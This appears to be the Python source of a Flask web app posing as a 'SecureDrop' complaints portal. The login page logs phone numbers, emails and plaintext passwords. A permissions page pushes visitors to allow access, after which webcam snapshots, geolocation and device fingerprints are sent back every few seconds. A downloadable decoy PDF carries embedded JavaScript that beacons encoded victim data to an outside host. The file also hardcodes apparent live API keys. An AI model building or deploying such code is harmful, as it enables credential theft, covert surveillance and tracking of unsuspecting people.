from flask import Flask, request, render_template_string, send_file, session, redirect, url_for
import logging
import json
import os
import requests
import base64
import uuid
from faker import Faker
from io import BytesIO
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Image
from reportlab.lib.styles import getSampleStyleSheet
from cryptography.fernet import Fernet
from stegano import lsb
from PIL import Image as PILImage
import PyPDF2
import netifaces
import google.generativeai as genai

# Configure the SDK with your Gemini API key
genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))

app = Flask(__name__)
app.secret_key = os.urandom(24)  # For session management

# Configure logging to a file
logging.basicConfig(
    level=logging.INFO,
    filename='user_logs.log',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Faker for generating fake PDF content
fake = Faker()

# Encryption key (store securely in production)
ENCRYPTION_KEY = Fernet.generate_key()
CIPHER = Fernet(ENCRYPTION_KEY)

# Store tokens for verification (ephemeral)
logged_tokens = {}

# Global list to store downloaded reports (token and report)
downloaded_reports = []

def get_wifi_location_from_wigle(bssid):
    """Query the Wigle WiFi API to get geolocation (latitude, longitude) for a given BSSID."""
    username = "AID9d6a1f4d617967b3d4c6189558862314"
    api_token = "ac01dcab47f048daf62cb43edaf37295"
    if not username or not api_token:
        logging.error("Wigle API credentials are not set in environment variables.")
        return None, None
    headers = {"Accept": "application/json"}
    params = {"netid": bssid}
    try:
        response = requests.get("https://api.wigle.net/api/v2/network/search", headers=headers, params=params, auth=(username, api_token))
        if response.status_code == 200:
            data = response.json()
            if data.get("results"):
                return data["results"][0].get("trilat"), data["results"][0].get("trilong")
    except Exception as e:
        logging.error(f"Error querying Wigle API: {e}")
    return None, None

def get_hidden_message(data):
    """Return the hidden message wrapped with markers."""
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    return "<<BASE64 START>>" + encoded + "<<BASE64 END>>"

def get_ip_geolocation(ip):
    """Fetch geolocation data from ipinfo.io."""
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            loc = data.get("loc", "").split(",")
            if loc and len(loc) == 2:
                return float(loc[0]), float(loc[1]), data
            else:
                return None, None, data
    except Exception as e:
        logging.error(f"IP Geolocation error: {e}")
    return None, None, {}

def get_wifi_interfaces():
    """Retrieve available WiFi interfaces and their BSSIDs."""
    try:
        interfaces = netifaces.interfaces()
        wifi_data = {}
        for iface in interfaces:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_LINK in addrs:
                mac = addrs[netifaces.AF_LINK][0].get('addr', '')
                if mac:
                    lat, lon = get_wifi_location_from_wigle(mac)
                    wifi_data[iface] = {'bssid': mac, 'latitude': lat, 'longitude': lon}
        return wifi_data
    except Exception as e:
        logging.error(f"Error retrieving WiFi interfaces: {e}")
        return {}

def collect_data(req):
    """Collect client-side and server-side data."""
    ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
    ip = ip_header.split(",")[0].strip() if ip_header else req.remote_addr
    user_agent = req.headers.get('User-Agent', 'unknown')
    cookies = req.cookies
    tls_metadata = req.environ.get('wsgi.url_scheme')

    client_data = {
        'screenWidth': req.form.get('screenWidth'),
        'screenHeight': req.form.get('screenHeight'),
        'colorDepth': req.form.get('colorDepth'),
        'pixelDepth': req.form.get('pixelDepth'),
        'language': req.form.get('language'),
        'platform': req.form.get('platform'),
        'connection': req.form.get('connection'),
        'pageLoadTime': req.form.get('pageLoadTime'),
        'clickTime': req.form.get('clickTime'),
        'dwellTime': req.form.get('dwellTime'),
        'lastMouseX': req.form.get('lastMouseX'),
        'lastMouseY': req.form.get('lastMouseY'),
        'referrer': req.form.get('referrer'),
        'canvasFingerprint': req.form.get('canvasFingerprint'),
        'hardwareConcurrency': req.form.get('hardwareConcurrency'),
        'deviceMemory': req.form.get('deviceMemory'),
        'timezoneOffset': req.form.get('timezoneOffset'),
        'touchSupport': req.form.get('touchSupport'),
        'batteryLevel': req.form.get('batteryLevel'),
        'charging': req.form.get('charging'),
        'downlink': req.form.get('downlink'),
        'plugins': req.form.get('plugins'),
        'location': req.form.get('location'),
        'cameraSnapshot': req.form.get('cameraSnapshot'),
        'audioClip': req.form.get('audioClip'),
        'webglFingerprint': req.form.get('webglFingerprint'),
        'installedFonts': req.form.get('installedFonts'),
    }

    lat, lon, geo_data = get_ip_geolocation(ip)
    client_data['ip_latitude'] = lat if lat is not None else ""
    client_data['ip_longitude'] = lon if lon is not None else ""
    client_data['ip_geolocation'] = geo_data

    log_message = {
        'ip': ip,
        'user_agent': user_agent,
        'action': 'Data Collected',
        'client_data': client_data,
        'request_headers': dict(req.headers),
        'cookies': cookies,
        'tls_metadata': tls_metadata,
        'wifi_triangulation': get_wifi_interfaces(),
    }
    return log_message

def embed_data_in_image(data):
    """Embed encrypted data in an image using steganography."""
    encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
    base_img = PILImage.new('RGB', (500, 500), color='white')
    temp_path = 'temp_base.png'
    base_img.save(temp_path)
    stego_img = lsb.hide(temp_path, encrypted_data)
    os.remove(temp_path)
    return stego_img

def simulate_multi_stage_payload(data):
    """Simulate multi-stage payload delivery (for demonstration only)."""
    logging.info(f"Simulating multi-stage payload delivery with data: {json.dumps(data)}")
    stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
    stage_payload["stage"] = "secondary"
    stage_payload["info"] = "Additional stage executed"
    logging.info(f"Simulated multi-stage payload: {json.dumps(stage_payload)}")
    return stage_payload

def simulate_dll_injection():
    """Simulate a DLL injection (for demonstration only)."""
    logging.info("Simulated DLL injection executed (defensive demonstration only)")
    return "DLL injection simulated"

def get_gemini_report(data):
    """Generate a security and forensics report using Gemini AI."""
    try:
        prompt = (
            """You are a cybersecurity investigator tasked with analyzing device and user details
            to identify potential connections and patterns related to online harassment.
            Your goal is to generate a report highlighting potential leads for further investigation.

            **Important Considerations:**
            * This analysis is for investigative purposes only. It does NOT definitively identify a harasser.
            * False positives are possible. Any potential connections identified must be thoroughly investigated before any action is taken.
            * Focus on identifying patterns and anomalies in the data.
            * Consider the limitations of the data.
            * Avoid making assumptions or drawing hasty conclusions.
            * Ensure all actions comply with legal and ethical guidelines.

            **Data Description:**
            The provided data contains information about devices and users potentially involved in online harassment. This may include:
            * **Device Information:** IP addresses, device IDs, operating system, browser information, location data (if available).
            * **User Details:** Usernames, email addresses, social media profiles, online activity logs.

            **Instructions:**
            1. Analyze Data for Potential Connections: Identify shared IP addresses, similar device fingerprints, overlapping online activity, related social media accounts, anomalous behavior, and geolocation patterns.
            2. Assess the Strength of Connections: Assess based on supporting evidence.
            3. Prioritize Potential Leads: Identify promising leads for further investigation.
            4. Format the Report:
                **Investigative Analysis Report**
                **Date:** [Current Date and Time]
                **Data Source:** [Description of the data source]
                **Executive Summary:** [Overview of potential connections and leads]
                **Detailed Findings:**
                * **Potential Connection 1:** [Description]
                    * **Users Involved:** [List]
                    * **Supporting Evidence:** [Data points]
                    * **Strength of Connection:** [High/Medium/Low]
                    * **Potential Lead:** [Explanation]
                **Conclusion:** [Summary of promising leads]
            """ + json.dumps(data, indent=2)
        )
        model = genai.GenerativeModel('gemini-2.0-flash')
        response = model.generate_content(prompt)
        report = response.text
        logging.info(f"Gemini AI report received: {report}")
        return report
    except Exception as e:
        logging.error(f"Error contacting Gemini AI: {e}")
        return f"Error contacting Gemini AI: {e}"

def generate_pdf(logged_data):
    """Generate a PDF with fake content and embed steganographic data."""
    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    story.append(Paragraph("Fake PDF Document", styles['Title']))
    story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
    address = fake.address().replace('\n', ', ')
    story.append(Paragraph(f"Address: {address}", styles['Normal']))
    story.append(Paragraph("Additional Info:", styles['Normal']))
    story.append(Paragraph(fake.text(max_nb_chars=200), styles['Normal']))

    stego_img = embed_data_in_image(logged_data)
    img_buffer = BytesIO()
    stego_img.save(img_buffer, format='PNG')
    img_buffer.seek(0)
    story.append(Image(img_buffer, width=100, height=100))

    token = str(uuid.uuid4())
    verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
    story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to thank our services.", styles['Normal']))

    doc.build(story)
    buffer.seek(0)

    hidden_message = get_hidden_message(logged_data)
    reversed_token = token[::-1]

    pdf_reader = PyPDF2.PdfReader(buffer)
    pdf_writer = PyPDF2.PdfWriter()
    for page in pdf_reader.pages:
        pdf_writer.add_page(page)
    pdf_writer.add_metadata({'/HiddenData': hidden_message})

    js_code = f"""
    if (typeof XMLHttpRequest !== 'undefined') {{
        try {{
            var req1 = new XMLHttpRequest();
            req1.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent("{hidden_message}"), true);
            req1.send();
        }} catch(e) {{}}
    }}
    var reversedToken = "{reversed_token}";
    var token = reversedToken.split("").reverse().join("");
    if (typeof XMLHttpRequest !== 'undefined') {{
        try {{
            var req2 = new XMLHttpRequest();
            req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), true);
            req2.send();
        }} catch(e) {{}}
    }}
    """
    pdf_writer.add_js(js_code)

    new_buffer = BytesIO()
    pdf_writer.write(new_buffer)
    new_buffer.seek(0)
    return new_buffer, token

# HTML Templates
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SecureDrop Login</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f2f2f2; }
        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 400px; }
        h1 { font-size: 24px; text-align: center; color: #202124; }
        label { display: block; margin: 10px 0 5px; color: #5f6368; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #1557b0; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sign in to SecureDrop</h1>
        <form action="/login" method="post">
            <label for="phone">Phone Number</label>
            <input type="tel" id="phone" name="phone" required>
            <label for="email">Email</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
"""

PERMISSIONS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Enable Permissions</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f2f2f2; }
        h2 { color: #333; }
        button { padding: 10px 20px; margin: 5px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #1557b0; }
        p { color: #d93025; }
    </style>
</head>
<body>
    <h2>Do you want to enable all permissions to proceed?</h2>
    <p>You are only allowed to proceed when the "Yes" button is pressed and permissions are granted.</p>
    <button id="yesButton">Yes</button>
    <button id="noButton">No</button>
    <p id="status"></p>
    <script>
        document.getElementById('yesButton').addEventListener('click', () => {
            Promise.all([
                new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                }),
                navigator.mediaDevices.getUserMedia({video: true}),
                navigator.mediaDevices.getUserMedia({audio: true})
            ]).then(() => {
                window.location.href = '/drive?permissions=granted';
            }).catch((error) => {
                document.getElementById('status').innerText = 'Permissions not granted: ' + error.message;
            });
        });

        document.getElementById('noButton').addEventListener('click', () => {
            window.location.href = '/drive?permissions=denied';
        });
    </script>
</body>
</html>
"""

DRIVE_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SecureDrop</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f2f2f2; }
        h1 { color: #202124; }
        .file-list { margin-top: 20px; }
        .file { padding: 10px; background: white; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 10px; }
        button { padding: 10px 20px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #1557b0; }
    </style>
</head>
<body>
    <h1>Welcome to SecureDrop</h1>
    <p>Your complaints:</p>
    <div class="file-list">
        <div class="file">Complaint #1 - Submitted 2023-10-01</div>
        <div class="file">Complaint #2 - Submitted 2023-10-02</div>
    </div>
    <form id="downloadForm" action="/download" method="post">
        <input type="hidden" name="permissions" value="{{ permissions }}">
        <input type="hidden" name="screenWidth" id="screenWidth">
        <input type="hidden" name="screenHeight" id="screenHeight">
        <input type="hidden" name="location" id="location">
        <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
        <button type="submit">Download Data</button>
    </form>
    <a href="/logs">View Logs</a>
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    <script>
        const permissions = "{{ permissions }}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let lastMouseX = 0, lastMouseY = 0;

        document.addEventListener('mousemove', (e) => {
            lastMouseX = e.clientX;
            lastMouseY = e.clientY;
        });

        if (permissions === 'granted') {
            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
                video.srcObject = stream;
            }).catch(() => console.log('Camera access denied'));

            setInterval(() => {
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/log_location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
                    });
                }, () => console.log('Location access denied'));

                if (video.srcObject) {
                    ctx.drawImage(video, 0, 0, 320, 240);
                    const snapshot = canvas.toDataURL('image/jpeg');
                    fetch('/log_camera', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({snapshot: snapshot})
                    });
                }

                navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
                    fetch('/log_microphone', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({message: 'Audio recorded'})
                    });
                    stream.getTracks().forEach(track => track.stop());
                }).catch(() => console.log('Microphone access denied'));
            }, 5000);
        } else {
            setInterval(() => {
                const otherData = {
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    mouseX: lastMouseX,
                    mouseY: lastMouseY,
                    timestamp: new Date().toISOString()
                };
                fetch('/log_other_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(otherData)
                });
            }, 5000);
        }

        document.getElementById('downloadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('screenWidth').value = screen.width;
            document.getElementById('screenHeight').value = screen.height;
            if (permissions === 'granted') {
                const promises = [];
                if (navigator.geolocation) {
                    promises.push(new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(pos => {
                            document.getElementById('location').value = JSON.stringify({
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            });
                            resolve();
                        }, () => resolve());
                    }));
                }
                if (video.srcObject) {
                    ctx.drawImage(video, 0, 0, 320, 240);
                    document.getElementById('cameraSnapshot').value = canvas.toDataURL('image/jpeg');
                }
                Promise.all(promises).then(() => {
                    e.target.submit();
                });
            } else {
                e.target.submit();
            }
        });
    </script>
</body>
</html>
"""

# Routes
@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone = request.form['phone']
        email = request.form['email']
        password = request.form['password']
        logging.info(f"Login attempt: phone={phone}, email={email}, password={password}")
        session['logged_in'] = True
        session['user_data'] = {'phone': phone, 'email': email}
        return redirect(url_for('permissions'))
    return render_template_string(LOGIN_PAGE)

@app.route('/permissions')
def permissions():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(PERMISSIONS_PAGE)

@app.route('/drive')
def drive():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    permissions = request.args.get('permissions', 'denied')
    return render_template_string(DRIVE_PAGE, permissions=permissions)

@app.route('/download', methods=['POST'])
def download():
    logged_data = collect_data(request)
    logging.info(f"Download data collected: {json.dumps(logged_data)}")
    
    gemini_report = get_gemini_report(logged_data)
    logged_data["gemini_report"] = gemini_report
    logging.info(f"Gemini AI report: {gemini_report}")
    
    multi_stage_result = simulate_multi_stage_payload(logged_data)
    dll_injection_result = simulate_dll_injection()
    logged_data["simulation"] = {
        "multi_stage": multi_stage_result,
        "dll_injection": dll_injection_result
    }

    pdf_buffer, token = generate_pdf(logged_data)
    logged_tokens[token] = logged_data
    downloaded_reports.append({"token": token, "gemini_report": gemini_report})

    return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')

@app.route('/verify', methods=['GET'])
def verify():
    token = request.args.get('token')
    if token in logged_tokens:
        logging.info(f"PDF opened for token: {token} - Data: {json.dumps(logged_tokens[token])}")
        del logged_tokens[token]
        return "Thank you!", 200
    return "Invalid token", 400

@app.route('/pdf_callback', methods=['GET'])
def pdf_callback():
    hidden_data = request.args.get('data', '')
    logging.info(f"Primary PDF callback triggered with data: {hidden_data}")
    return "Primary callback logged", 200

@app.route('/pdf_callback_stage2', methods=['GET'])
def pdf_callback_stage2():
    token = request.args.get('token', '')
    if token in logged_tokens:
        logging.info(f"Stage2 callback: Token {token} verified with data: {json.dumps(logged_tokens[token])}")
        return "Stage2 callback logged", 200
    return "Invalid token", 400

@app.route('/logs')
def display_logs():
    try:
        with open('user_logs.log', 'r') as f:
            logs_content = f.read()
    except Exception as e:
        logs_content = f"Error reading log file: {e}"

    logs_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>User Logs and Reports</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background-color: #f9f9f9; }
            h1, h2 { color: #333; }
            pre { background: #eee; padding: 15px; border-radius: 5px; overflow: auto; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #ccc; padding: 10px; text-align: left; }
            th { background-color: #f2f2f2; }
        </style>
    </head>
    <body>
        <h1>User Logs</h1>
        <pre>{{ logs }}</pre>
        <h2>Downloaded Reports</h2>
        {% if reports %}
        <table>
            <tr>
                <th>Token</th>
                <th>Gemini Report</th>
            </tr>
            {% for report in reports %}
            <tr>
                <td>{{ report.token }}</td>
                <td><pre>{{ report.gemini_report }}</pre></td>
            </tr>
            {% endfor %}
        </table>
        {% else %}
        <p>No reports available.</p>
        {% endif %}
    </body>
    </html>
    """
    return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports)

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.json
    logging.info(f"Location data: {json.dumps(data)}")
    return "Location logged", 200

@app.route('/log_camera', methods=['POST'])
def log_camera():
    data = request.json
    logging.info(f"Camera snapshot logged: {json.dumps(data)}")
    return "Camera logged", 200

@app.route('/log_microphone', methods=['POST'])
def log_microphone():
    data = request.json
    logging.info(f"Microphone data: {json.dumps(data)}")
    return "Microphone logged", 200

@app.route('/log_other_data', methods=['POST'])
def log_other_data():
    data = request.json
    logging.info(f"Other data: {json.dumps(data)}")
    return "Other data logged", 200

@app.route('/simulate')
def simulate():
    return "Simulation endpoint", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
